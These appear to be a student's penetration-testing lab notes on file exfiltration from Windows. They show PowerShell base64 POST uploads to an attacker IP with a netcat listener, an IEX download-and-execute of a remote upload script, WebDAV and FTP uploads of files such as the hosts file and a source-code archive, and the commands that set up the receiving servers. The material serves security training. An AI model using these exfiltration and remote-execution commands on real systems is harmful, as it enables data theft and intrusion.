We can use multiple options to upload the files. Let first take look using Powershell.

### PowerShell Base64 Encode & Decode

Convert file into `base64` and copy the text.
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

To check `md5` hash and calculate later for validity of file.
```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

In linux decode file and calculate the hash.
```bash
echo 'hash' | base64 -d

md5 hosts
```

### PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We also need web-server but by default not option in most web-server utilities.

we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page.

#### Installing
```bash
pip3 install uploadserver

python3 -m uploadserver
```

PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. It accept two parm `-File` and `-Uri`. 

First we download `powershell` script and then download the file.
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')


Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

```


### PowerShell Base64 Web Upload
Another way to upload file is using `Invoke-WebRequest` or `Invoke-RestMethod` with `netcat`. 
use `netcat` to listen on port  and send file as `POST` request. `Copy` output and use `base64` decoded fun to convert into file.

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))


 Invoke-WebRequest -Uri http://192.168.49.128:4444/ -Method POST -Body $b64
```

Now using `nc` start listener on linux machine.
```bash
nc -nvlp 4444
```



### SMB Uploads

Companies allow `Http` and `Https` traffic but not always `SMB`. For more information on this, we can read the [Microsoft post.](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP and protocol that web browser or server use. `WebDav` enable webserver behave like `fileserver` and also can use `Https`.

When you use `SMB`, it will first attempt to connect using the `SMB` protocol, and if there's no `SMB` share available, it will try to connect using `HTTP`.

![[Pasted image 20251019135357.png]]

First install two Python modules, `wsgidav` and `cheroot`  [wsgidav github](https://github.com/mar10/wsgidav)). Now we run the `wsgidav` application in the target directory.

```bash
sudo pip3 install wsgidav cheroot
```

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

#### Connecting to  Webdav  From Window CMD

At end add real `dir` name that exist on `server` or add `dir` that don't exists.
```cmd
dir \\192.168.49.128\DavWWWRoot
```

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

`Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.`



### FTP Uploads
Uploading files using FTP is very similar to downloading files. We can use `PowerShell` or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

#### PowerShell Upload File

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Create a Command File for the FTP Client to Upload a File
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```